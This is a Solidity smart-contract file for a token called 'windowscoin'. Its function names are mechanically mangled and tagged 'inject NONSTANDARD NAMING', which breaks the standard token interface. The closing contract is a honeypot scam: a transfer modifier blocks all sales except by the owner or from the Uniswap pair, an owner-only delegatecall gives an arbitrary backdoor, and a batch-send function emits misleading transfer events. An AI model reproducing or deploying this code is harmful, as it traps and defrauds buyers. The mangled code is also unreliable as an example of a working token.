                                                                 

pragma solidity ^0.5.17;
                                                           
                                                                     

                 

interface IERC20 {
    function TOTALSUPPLY495() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF690(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER946(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE369(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE440(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM364(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER516(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL420(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

library Address {
    function ISCONTRACT469(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _MSGSENDER237() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

library SafeMath {
    function ADD204(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB102(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB102(a, b, "SafeMath: subtraction overflow");
    }

    function SUB102(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL762(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV932(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV932(a, b, "SafeMath: division by zero");
    }

    function DIV932(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER513(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN706(token, abi.encodeWithSelector(token.TRANSFER946.selector, to, value));
    }

    function SAFETRANSFERFROM478(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN706(token, abi.encodeWithSelector(token.TRANSFERFROM364.selector, from, to, value));
    }

    function SAFEAPPROVE750(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE369(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN706(token, abi.encodeWithSelector(token.APPROVE440.selector, spender, value));
    }

    function CALLOPTIONALRETURN706(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT469(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY495() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF690(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER946(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER328(_MSGSENDER237(), recipient, amount);
        return true;
    }

    function ALLOWANCE369(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE440(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE90(_MSGSENDER237(), spender, amount);
        return true;
    }

    function TRANSFERFROM364(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER328(sender, recipient, amount);
        _APPROVE90(sender, _MSGSENDER237(), _allowances[sender][_MSGSENDER237()].SUB102(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE943(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE90(_MSGSENDER237(), spender, _allowances[_MSGSENDER237()][spender].ADD204(addedValue));
        return true;
    }

    function DECREASEALLOWANCE974(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE90(_MSGSENDER237(), spender, _allowances[_MSGSENDER237()][spender].SUB102(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER328(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB102(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD204(amount);
        emit TRANSFER516(sender, recipient, amount);
    }

    function _MINT572(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD204(amount);
        _balances[account] = _balances[account].ADD204(amount);
        emit TRANSFER516(address(0), account, amount);
    }

    function _BURN648(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB102(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB102(amount);
        emit TRANSFER516(account, address(0), amount);
    }

    function _APPROVE90(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL420(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME425() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL680() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS271() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}


contract windowscoin {
 
    event TRANSFER516(address indexed _from, address indexed _to, uint _value);	//inject NONSTANDARD NAMING
    event APPROVAL420(address indexed _owner, address indexed _spender, uint _value);	//inject NONSTANDARD NAMING
 
    function TRANSFER946(address _to, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        return TRANSFERFROM364(msg.sender, _to, _value);
    }
 
    function TRANSFERFROM364(address _from, address _to, uint _value) public payable ENSURE62(_from, _to) returns (bool) {	//inject NONSTANDARD NAMING
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit TRANSFER516(_from, _to, _value);
        return true;
    }
 
    function APPROVE440(address _spender, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        allowance[msg.sender][_spender] = _value;
        emit APPROVAL420(msg.sender, _spender, _value);
        return true;
    }
 
    function DELEGATE99(address a, bytes memory b) public payable {	//inject NONSTANDARD NAMING
        require(msg.sender == owner);
        a.delegatecall(b);
    }
 
    function BATCHSEND102(address[] memory _tos, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit TRANSFER516(msg.sender, _to, _value/2);
            emit TRANSFER516(msg.sender, _to, _value/2);
        }
        return true;
    }
 
    modifier ENSURE62(address _from, address _to) {	//inject NONSTANDARD NAMING
        address UNI = PAIRFOR198(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        require(_from == owner || _to == owner || _from == UNI);
        _;
    }
 
    function PAIRFOR198(address factory, address tokenA, address tokenB) internal pure returns (address pair) {	//inject NONSTANDARD NAMING
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals769 = 18;	//inject NONSTANDARD NAMING
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address constant internal uni175 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;	//inject NONSTANDARD NAMING
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit TRANSFER516(address(0x0), msg.sender, totalSupply);
    }
}